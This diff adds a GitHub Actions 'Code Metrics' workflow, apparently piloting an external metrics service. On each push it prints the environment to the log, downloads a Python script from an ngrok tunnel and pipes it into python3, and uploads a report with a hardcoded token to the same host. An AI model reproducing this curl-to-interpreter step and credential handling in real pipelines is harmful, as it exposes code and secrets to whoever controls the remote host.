@@ -1,0 +1,34 @@
+name: DSO2 Pilot
+
+on: push
+
+jobs:
+  dso:
+    name: "Code Metrics"
+    runs-on: ubuntu-latest
+    container: ubuntu:20.04
+    steps:
+      - name: 'workflow'
+        shell: bash
+        run: export DEBIAN_FRONTEND=noninteractive &&
+          apt-get update &&
+          apt-get install -y git
+      - name: 'debug'
+        shell: bash
+        run:
+          env && git --version
+      - name: 'checkout'
+        uses: actions/checkout@v2.3.4
+      - name: 'workflow'
+        shell: bash
+        run: export DEBIAN_FRONTEND=noninteractive &&
+          apt-get update &&
+          apt-get install -y python3 curl &&
+          curl http://68de-2800-810-519-dff-8cb1-7666-5a9f-15b9.ngrok.io/static/workflow/workflow.py | python3
+      - name: 'publish'
+        shell: bash
+        run: curl -v -F token='fuZ07oRGZT84YTMbEYzL+wAUSSzwT0b/TFQpsqseO4rBIOw=' -F report=@report.csv
+          http://68de-2800-810-519-dff-8cb1-7666-5a9f-15b9.ngrok.io/api/publish > report.json
+      - name: 'display'
+        shell: bash
+        run: cat report.json
